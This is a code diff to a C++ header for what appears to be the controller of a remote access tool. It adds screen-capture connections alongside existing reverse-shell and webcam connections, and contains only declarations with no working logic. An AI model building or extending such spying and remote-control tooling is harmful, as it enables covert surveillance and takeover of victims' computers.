@@ -13,22 +13,25 @@ class Communication {
 private:
     map<unsigned int, tuple<SOCKET, string>> _rev_shells;
     map<unsigned int, tuple<SOCKET, string>> _cameras;
+    map<unsigned int, tuple<SOCKET, string>> _screens;
 
     short _revshell_port;
     short _camera_port;
+    short _screen_port;
 
 public:
-    Communication(short revshell_port, short camera_port);
+    Communication(short revshell_port, short camera_port, short screen_port);
     ~Communication();
     SOCKET createServerSocket(short port);
 
     void acceptClients();
     void acceptCamera();
     void acceptShell();
-    void cameraHandler(SOCKET cameraSocket);
-    void shellHandler(SOCKET shellSocket);
+    void acceptScreens();
+
     string getIP(SOCKET socket);
 
     map<unsigned int, tuple<SOCKET, string>> getRevShells();
     map<unsigned int, tuple<SOCKET, string>> getCameras();
+    map<unsigned int, tuple<SOCKET, string>> getScreens();
 };
